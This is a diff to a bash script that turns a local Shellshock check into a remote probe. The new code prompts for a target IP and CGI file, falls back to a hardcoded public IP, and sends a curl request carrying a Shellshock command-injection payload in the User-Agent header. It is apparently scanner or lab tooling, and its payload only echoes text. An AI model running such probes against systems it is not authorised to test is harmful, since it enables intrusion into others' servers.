@@ -10,10 +10,24 @@ version=${version/(*/}
 oldIFS=$IFS
 IFS='.' read -r -a version_arr <<< "$version"
 
-if [[ "${version_arr[0]}" -le '4' ]] && [[ "${version_arr[1]}" -le '3' ]]; then
-	shellshock=$(env X="() { :;} ; echo vulnerable" /bin/bash -c echo not-vulnerable)
+if [[ "${version_arr[0]}" -le '4' ]] && [[ "${version_arr[1]}" -le '3' ]]; 
+then
+	default_ip=18.219.242.244
+	default_cgi=example-bash
+
+	read -p "Enter target IP address: " -a target_ip
+	read -p "Enter name of cgi file: " -a cgi_file
+
+	if [[ -z "$target_ip" ]] || [[ -z "$cgi_file" ]]; 
+	then
+		echo Proceeding with default IP address $default_ip and cgi file $default_cgi 
+
+		shellshock=$(curl -H "User-Agent: () { :; }; echo; echo vulnerable; bash -c 'echo hello'" http://$default_ip/cgi-bin/$default_cgi)
+	else
+		shellshock=$(curl -H "User-Agent: () { :; }; echo; echo vulnerable; bash -c 'echo hello'" http://$target_ip/cgi-bin/$cgi_file)
+	fi 
 		
-	if [[ "$shellshock" != "not-vulnerable" ]]; then
+	if [[ "$shellshock" = "vulnerable" ]]; then
 		echo "Version suscpetible to shellshock exploit"
 		EXPLOITABLE=1
 	fi
